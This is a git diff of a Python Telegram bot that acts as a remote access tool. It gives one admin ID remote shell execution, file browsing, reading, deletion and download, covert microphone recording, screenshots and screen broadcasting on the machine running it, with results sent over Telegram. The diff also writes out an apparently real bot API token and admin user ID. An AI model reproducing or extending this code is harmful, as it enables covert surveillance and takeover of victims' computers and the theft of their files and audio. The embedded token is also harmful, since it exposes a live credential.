@@ -5,19 +5,111 @@ from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemo
 import pyaudio
 import wave
 import os
+import pickle
 
-API_TOKEN = "<token>"
-ADMIN = <id>
+# Variables
+API_TOKEN = "6485700500:AAGLgS_85x46iZhxcZIxk8mKNtAUdfhaAvU"
+ADMIN = 804011643
+
+filename_audio = "recorded_audio.wav"
+filename_video = "recorded_video.avi"
+filename_screenshot = "screenshot.jpg"
+
+chunk = 1024
+FORMAT = pyaudio.paInt16
+channels = 1
+sample_rate = 44100
 
 bot = TeleBot(API_TOKEN)
 
 markup = ReplyKeyboardMarkup(True, True)
-markup.add(KeyboardButton("cd"),           KeyboardButton("cd_path"),
-           KeyboardButton("dir"),          KeyboardButton("del"),
-           KeyboardButton("type"),         KeyboardButton("get_file"),
-           KeyboardButton("exec_cmd_sub"), KeyboardButton("record"),
-           KeyboardButton("screenshot"),   KeyboardButton("screen_broadcast"))
+markup.add(KeyboardButton("cd"), KeyboardButton("cd_path"),
+           KeyboardButton("dir"), KeyboardButton("del"),
+           KeyboardButton("type"), KeyboardButton("get_file"),
+           KeyboardButton("exec_cmd"), KeyboardButton("record_audio"),
+           KeyboardButton("dump_audio"), KeyboardButton("screenshot"),
+           KeyboardButton("screen_broadcast"))
 
+
+# Fn(1)
+def create_markup(markup):
+    list_files = os.listdir(os.getcwd())
+    for i in list_files:
+        markup.add(i)
+        
+    markup.add("None")
+
+def recordAUDIO(time=6):
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=channels,
+                    rate=sample_rate,
+                    input=True,
+                    output=True,
+                    frames_per_buffer=chunk)
+    
+    frames = []
+    for i in range(int(sample_rate / chunk * time)):
+        data = stream.read(chunk)
+        frames.append(data)
+
+        with open('dump_record_audio.dat', 'wb') as dump_out:
+            pickle.dump(frames, dump_out, protocol=3)
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+    wf = wave.open(filename_audio, "wb")
+    wf.setnchannels(channels)
+    wf.setsampwidth(p.get_sample_size(FORMAT))
+    wf.setframerate(sample_rate)
+
+    wf.writeframes(b"".join(frames))
+    
+    wf.close()
+
+def checkID(ms):
+    if ms.from_user.id == ADMIN:
+        return True
+    else:
+        info = f"""
+        Name - {ms.from_user.first_name}
+        Surname - {ms.from_user.last_name}
+        UserName - {ms.from_user.username}
+        Language - {ms.from_user.language_code}
+        """
+        bot.send_message(ADMIN, "USED:")
+        bot.send_message(ADMIN, info)
+        return False
+
+
+# Fn(2)
+def dump_audio():
+    with open("dump_record_audio.dat", "rb") as dump_in:
+        unpickler = pickle.Unpickler(dump_in)
+        frame = unpickler.load()
+
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT,
+                        channels=channels,
+                        rate=sample_rate,
+                        input=True,
+                        output=True,
+                        frames_per_buffer=chunk)
+        
+        wf = wave.open(filename_audio, "wb")
+        wf.setnchannels(channels)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(sample_rate)
+        wf.writeframes(b"".join(frame))
+        wf.close()
+        
+        bot.send_message(ADMIN, "Unpacked!")
+        
+        with open(filename_audio, "rb") as audio:
+            bot.send_audio(ADMIN, audio)
+        
+        os.remove(filename_audio)
 
 def screen_broadcast(ms):
     bot.send_message(ADMIN, "Enter...")
@@ -51,62 +143,11 @@ def screen_broadcast(ms):
     
     bot.register_next_step_handler(ms, screen_broadcast_next)
 
-def create_markup(markup):
-    list_files = os.listdir(os.getcwd())
-    for i in list_files:
-        markup.add(i)
-        
-    markup.add("None")
-
-def record(time=6):
-    filename = "recorded.wav"
-
-    chunk = 1024
-    FORMAT = pyaudio.paInt16
-    channels = 1
-    sample_rate = 44100
-
-    p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT,
-                    channels=channels,
-                    rate=sample_rate,
-                    input=True,
-                    output=True,
-                    frames_per_buffer=chunk)
-    frames = []
-    for i in range(int(44100 / chunk * time)):
-        data = stream.read(chunk)
-        frames.append(data)
-
-    stream.stop_stream()
-    stream.close()
-    p.terminate()
-    wf = wave.open(filename, "wb")
-    wf.setnchannels(channels)
-    wf.setsampwidth(p.get_sample_size(FORMAT))
-    wf.setframerate(sample_rate)
-    wf.writeframes(b"".join(frames))
-    wf.close()
-
-def checkID(ms):
-    if ms.from_user.id == ADMIN:
-        return True
-    else:
-        info = f"""
-        Name - {ms.from_user.first_name}
-        Surname - {ms.from_user.last_name}
-        UserName - {ms.from_user.username}
-        Language - {ms.from_user.language_code}
-        """
-        bot.send_message(ADMIN, "USED:")
-        bot.send_message(ADMIN, info)
-        return False
-
-def exec_cd():
+def cd():
     output = os.getcwd()
     bot.send_message(ADMIN, output, reply_markup=markup)
 
-def exec_cd_path(ms):
+def cd_path(ms):
     markup_cd = ReplyKeyboardMarkup()
     create_markup(markup_cd)
     markup_cd.add("..")
@@ -128,7 +169,7 @@ def exec_cd_path(ms):
 
     bot.register_next_step_handler(ms, exec_cd_path_next)
 
-def exec_dir():
+def dir():
     try:
         list_files = os.listdir(os.getcwd())
         output = ""
@@ -142,13 +183,13 @@ def exec_dir():
     except Exception as e:
         bot.send_message(ADMIN, f"Error:\n{e}")
 
-def exec_del(ms):
+def del_path(ms):
     markup_del = ReplyKeyboardMarkup()
     create_markup(markup_del)
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_del)
 
     @bot.message_handler(content_types=["text"])
-    def exec_del_next(ms):
+    def del_path_next(ms):
         if ms.text != "None":
             try:
                 path_file = ms.text
@@ -160,9 +201,9 @@ def exec_del(ms):
         bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
-    bot.register_next_step_handler(ms, exec_del_next)
+    bot.register_next_step_handler(ms, del_path_next)
 
-def exec_type(ms):
+def type(ms):
     markup_type = ReplyKeyboardMarkup()
     create_markup(markup_type)
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_type)
@@ -185,7 +226,7 @@ def exec_type(ms):
 
     bot.register_next_step_handler(ms, exec_type_next)
 
-def exec_get_file(ms):
+def get_file(ms):
     markup_file = ReplyKeyboardMarkup()
     create_markup(markup_file)
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_file)
@@ -204,11 +245,11 @@ def exec_get_file(ms):
                 
     bot.register_next_step_handler(ms, get_file_next)
 
-def exec_recording(ms):
+def recording_audio(ms):
         bot.send_message(ADMIN, "Enter time, quantity iteration...")
         
         @bot.message_handler(content_types=["text"])
-        def micro_recording_last(ms):
+        def recording_audio_next(ms):
             try:
                 list_data = ms.text.split(" ")
                 time = int(list_data[0])
@@ -216,28 +257,31 @@ def exec_recording(ms):
                 bot.send_message(ADMIN, "Recording...")
                 
                 for i in range(quantity):
-                    record(time)
-                    with open("recorded.wav", 'rb') as audio:
+                    recordAUDIO(time)
+                    with open(filename_audio, 'rb') as audio:
                         bot.send_audio(ADMIN, audio)
                 
+                os.remove(filename_audio)
                 bot.send_message(ADMIN, "Finished recording.")
             except Exception as e:
-                    bot.send_message(ADMIN, f"Error:\n{e}")
+                bot.send_message(ADMIN, f"Error:\n{e}")
 
-        bot.register_next_step_handler(ms, micro_recording_last)
+        bot.register_next_step_handler(ms, recording_audio_next)
 
-def exec_screenshot():
+def screenshot():
     myScreenshot = pyautogui.screenshot()
     myScreenshot.save("screenshot.jpg")
 
-    with open("screenshot.jpg", "rb") as photo:
+    with open(filename_screenshot, "rb") as photo:
         bot.send_photo(ADMIN, photo, reply_markup=markup)
+    
+    os.remove(filename_screenshot)
 
-def exec_cmd_sub(ms):
+def exec_cmd(ms):
     bot.send_message(ADMIN, "Enter command...")
 
     @bot.message_handler(content_types=["text"])
-    def exec_cmd_os_next(ms):
+    def exec_cmd_next(ms):
         try:
             cmd = ms.text
             output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -249,8 +293,9 @@ def exec_cmd_sub(ms):
         except Exception as e:
             bot.send_message(ADMIN, f"Error:\n{e}")
 
-    bot.register_next_step_handler(ms, exec_cmd_os_next)
+    bot.register_next_step_handler(ms, exec_cmd_next)
 
+# Start
 @bot.message_handler(commands=["_start", "_help"])
 def send_welcome(ms):
     if checkID(ms):
@@ -261,31 +306,34 @@ def send_welcome(ms):
 def CheckCommand(ms):
     if checkID(ms):
         if ms.text == "cd":
-            exec_cd()
+            cd()
 
         elif ms.text == "cd_path":
-            exec_cd_path(ms)
+            cd_path(ms)
 
         elif ms.text == "dir":
-            exec_dir()
+            dir()
 
         elif ms.text == "del":
-            exec_del(ms)
+            del_path(ms)
         
         elif ms.text == "type":
-            exec_type(ms)
+            type(ms)
         
         elif ms.text == "get_file":
-            exec_get_file(ms)
+            get_file(ms)
 
-        elif ms.text == "exec_cmd_sub":
-            exec_cmd_sub(ms)
+        elif ms.text == "exec_cmd":
+            exec_cmd(ms)
 
-        elif ms.text == "record":
-            exec_recording(ms)
+        elif ms.text == "record_audio":
+            recording_audio(ms)
+
+        elif ms.text == "dump_audio":
+            dump_audio()
 
         elif ms.text == "screenshot":
-            exec_screenshot(ms)
+            screenshot()
 
         elif ms.text == "screen_broadcast":
             screen_broadcast(ms)
